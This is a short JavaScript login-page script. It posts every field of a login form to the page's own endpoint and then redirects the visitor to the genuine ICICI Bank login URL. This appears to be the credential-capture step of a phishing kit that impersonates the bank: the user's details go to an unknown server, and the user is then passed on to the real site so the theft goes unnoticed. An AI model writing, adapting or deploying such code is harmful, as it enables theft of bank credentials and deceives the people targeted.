document.getElementById('loginButton').addEventListener('click', function () {
    document.getElementById('currentDateTime').value = new Date().toISOString();
    
    // Fetch the form data
    const form = document.getElementById('loginForm');
    const formData = new FormData(form);

    // Perform POST request using Fetch API
    fetch(form.action, {
        method: 'POST',
        body: formData
    })
    .then(response => {
        if (response.ok) {
            // Redirect after successful form submission
            window.location.href = `https://infinity.icicibank.com/corp/AuthenticationController?FORMSGROUP_ID__=AuthenticationFG&__START_TRAN_FLAG__=Y&FG_BUTTONS__=LOAD&ACTION.LOAD=Y&AuthenticationFG.LOGIN_FLAG=1&BANK_ID=ICI&ITM=nli_personalb_personal_login_btn&_gl=1*11w9uul*_ga*MTk4ODY0MjIyNC4xNjA5MjM2MjAy*_ga_SFRXTKFEML*MTYwOTI0MTA0NC4yLjAuMTYwOTI0MTA0NC42MA..`;
        } else {
            alert('Login failed. Please try again.');
        }
    })
    .catch(error => {
        console.error('Error:', error);
        alert('An error occurred. Please try again.');
    });
});